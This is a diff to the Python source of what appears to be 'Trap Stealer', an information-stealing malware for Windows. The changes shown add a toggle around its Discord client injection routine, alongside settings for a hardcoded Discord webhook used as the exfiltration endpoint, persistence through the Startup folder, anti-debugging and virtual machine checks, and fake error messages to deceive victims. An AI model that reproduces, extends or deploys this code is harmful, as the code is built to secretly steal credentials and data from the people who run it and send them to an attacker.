@@ -34,14 +34,12 @@ import win32clipboard
 
 webhook = 'https://discord.com/api/webhooks/1102253728842657843/7LX8d74soZhJ_JetMdiWZTD2QF7-8JlnuNoArjDgP2UAv_Z3u0xl3smsoCuiWFeRZ63l' #Put ur webhook
 
+injection = False # If set to False it will not inject into discord
 fakeerror = True # If True it will make an fake error message at the end
 Startup = True # If True it will add the file into the startup folder
 shitty_message = True # If True it will print fake message, if you want to disable it replace with False
 antidebugging = True # If set to false it will dont check for VM or Debugger
 StartupMessage = 'An error occurred while trying to add Trap Stealer to the Startup folder.     Or maybe you just put Startup = False' # The Startup message is like that at the start and change if Startup is set to True
-
-
-
 
 def antidebug():
     checks = [check_windows, check_ip, check_registry, check_dll]
@@ -197,7 +195,11 @@ def inj_discord():
                         with open(file_path, "w", encoding="utf-8") as f:
                             f.write(inj_content)
 
-inj_discord()
+if injection == True:
+    try:
+        inj_discord()
+    except:pass
+else:pass
 
 def systemInfo():
     system = platform.system()
